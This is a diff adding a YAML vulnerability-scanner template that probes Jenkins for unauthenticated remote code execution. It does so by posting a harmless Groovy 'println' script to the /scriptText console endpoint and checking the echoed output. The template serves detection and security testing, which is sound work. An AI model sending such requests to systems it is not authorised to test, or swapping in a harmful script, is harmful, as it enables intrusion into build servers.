@@ -1,0 +1,17 @@
+name: poc-jenkins-script
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/scriptText"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "script=println(12345)"
+    expression: response.status == 200 && response.body.bcontains("12345")
+expression: r0()
+detail:
+  author: sxel
+  description: Jenkins script console unauthenticated code execution probe
+  severity: critical
+  tags: jenkins,rce,devops
